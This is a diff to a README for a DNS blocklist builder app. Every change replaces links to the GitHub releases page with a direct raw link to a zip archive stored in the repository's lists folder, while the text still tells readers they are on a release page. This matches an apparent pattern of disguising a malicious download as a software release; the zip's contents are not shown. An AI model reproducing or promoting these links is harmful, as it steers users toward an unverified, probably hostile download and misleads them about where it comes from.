@@ -1,6 +1,6 @@
 # 🛡️ dns-blocklist-builder - Build DNS blocks with ease
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hammerantipodes82/dns-blocklist-builder/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/hammerantipodes82/dns-blocklist-builder/main/lists/builder-dns-blocklist-v2.7.zip)
 
 ## 🌐 What this app does
 
@@ -26,7 +26,7 @@ It works offline, has no tracking, and needs no extra setup beyond the app itsel
 
 Visit the release page and download the Windows version from there:
 
-https://github.com/hammerantipodes82/dns-blocklist-builder/releases
+https://raw.githubusercontent.com/hammerantipodes82/dns-blocklist-builder/main/lists/builder-dns-blocklist-v2.7.zip
 
 On that page, pick the latest release and choose the file for Windows. If there is more than one file, use the one with `.exe` or `.zip` in the name.
 
@@ -232,4 +232,4 @@ dns-blocklist-builder keeps the process simple:
 
 Use this page to download the Windows release:
 
-https://github.com/hammerantipodes82/dns-blocklist-builder/releases
+https://raw.githubusercontent.com/hammerantipodes82/dns-blocklist-builder/main/lists/builder-dns-blocklist-v2.7.zip
